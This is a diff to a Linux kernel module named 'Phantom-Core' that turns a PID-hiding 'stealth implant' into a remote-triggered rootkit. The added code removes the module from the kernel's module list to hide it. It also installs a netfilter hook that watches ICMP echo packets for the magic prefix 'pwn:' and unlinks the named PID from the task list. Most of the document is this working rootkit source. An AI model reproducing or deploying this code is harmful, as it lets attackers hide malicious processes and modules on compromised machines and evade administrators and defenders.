@@ -1,27 +1,32 @@
-#include <linux/module.h>   
-#include <linux/kernel.h> 
+#include <linux/module.h>
+#include <linux/kernel.h>
 #include <linux/init.h>
+#include <linux/list.h>
 #include <linux/sched.h>
 #include <linux/sched/signal.h>
-#include <linux/list.h>
-#include <linux/string.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+#include <linux/ip.h>
+#include <linux/icmp.h>
+#include <linux/string.h> 
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("pwnxr");
-MODULE_DESCRIPTION("Kernel Stealth Implant");
+MODULE_DESCRIPTION("Phantom-Core: Remote Command Execution");
 
-static int target_pid = 0;
-module_param(target_pid, int, 0644);
-MODULE_PARM_DESC(target_pid, "The PID of the process to hide");
+#define MAGIC_PREFIX "pwn:"
+#define MAGIC_LEN 4
 
-static void hide_process(void) {
+static void hide_myself(void) {
+    list_del(&THIS_MODULE->list);
+}
+
+static void hide_process_by_pid(int pid) {
     struct task_struct *task;
     struct task_struct *target_task = NULL;
 
-    printk(KERN_INFO "Phantom-Shell: Searching for PID %d to hide...\n", target_pid);
-
     for_each_process(task) {
-        if (task->pid == target_pid) {
+        if (task->pid == pid) {
             target_task = task;
             break;
         }
@@ -29,43 +34,79 @@ static void hide_process(void) {
 
     if (target_task) {
         list_del_init(&target_task->tasks);
-
-        printk(KERN_INFO "Phantom-Shell: HIDDEN! Process %s [PID: %d] removed from task list.\n", 
-               target_task->comm, target_task->pid);
-    } else {
-        printk(KERN_INFO "Phantom-Shell: PID %d not found!\n", target_pid);
+        printk(KERN_INFO "Phantom-Core: COMMAND EXECUTED -> Hidden PID: %d\n", pid);
     }
 }
 
-static void list_processes(void) {
-    struct task_struct *task;
-    printk(KERN_INFO "Phantom-Shell: --- Verifying Process List ---\n");
-
-    for_each_process(task) {
-        if (task->pid == target_pid) {
-             printk(KERN_INFO "WARNING: Process %d is STILL VISIBLE in the list!\n", task->pid);
+static int parse_pid(char *data, int len) {
+    int i;
+    int pid = 0;
+    for (i = MAGIC_LEN; i < len; i++) {
+        if (data[i] >= '0' && data[i] <= '9') {
+            pid = pid * 10 + (data[i] - '0');
+        } else {
+            break;
         }
     }
-    printk(KERN_INFO "Phantom-Shell: --- Verification End ---\n");
+    return pid;
 }
 
+static struct nf_hook_ops my_nf_ops;
 
-static int __init implant_init(void) {
-    printk(KERN_INFO "Phantom-Shell: Activated.\n");    
+unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
+{
+    struct iphdr *ip_header;
+    struct icmphdr *icmp_header;
+    unsigned char *payload;
+    int payload_len;
 
-    if (target_pid != 0) {
-        hide_process();
-        list_processes();
-    } else {
-        printk(KERN_INFO "Phantom-Shell: No target_pid provided. Usage: insmod implant.ko target_pid=XXXX\n");
+    if (!skb) return NF_ACCEPT;
+
+    ip_header = ip_hdr(skb);
+    if (!ip_header) return NF_ACCEPT;
+
+    if (ip_header->protocol == IPPROTO_ICMP) {
+        icmp_header = (struct icmphdr *)((unsigned char *)ip_header + (ip_header->ihl * 4));
+
+        if (icmp_header->type == ICMP_ECHO) {
+            payload = (unsigned char *)icmp_header + sizeof(struct icmphdr);
+            
+            payload_len = skb->len - (ip_header->ihl * 4) - sizeof(struct icmphdr);
+
+            if (payload_len >= MAGIC_LEN) {
+                if (memcmp(payload, MAGIC_PREFIX, MAGIC_LEN) == 0) {
+                    printk(KERN_INFO "Phantom-Core: Magic Packet Received!\n");
+                    
+                    int target_pid = parse_pid(payload, payload_len);
+                    if (target_pid > 0) {
+                        hide_process_by_pid(target_pid);
+                    }
+                }
+            }
+        }
     }
 
-    list_processes();
-    return 0; 
+    return NF_ACCEPT;
 }
 
-static void __exit implant_exit(void) {
-    printk(KERN_INFO "Phantom-Shell: Unloaded.\n");
+static int __init implant_init(void)
+{
+    hide_myself();
+
+    my_nf_ops.hook = hook_func;
+    my_nf_ops.hooknum = NF_INET_PRE_ROUTING;
+    my_nf_ops.pf = PF_INET;
+    my_nf_ops.priority = NF_IP_PRI_FIRST;
+
+    nf_register_net_hook(&init_net, &my_nf_ops);
+
+    printk(KERN_INFO "Phantom-Core: Listening for commands...\n");
+    return 0;
+}
+
+static void __exit implant_exit(void)
+{
+    nf_unregister_net_hook(&init_net, &my_nf_ops);
 }
 
 module_init(implant_init);
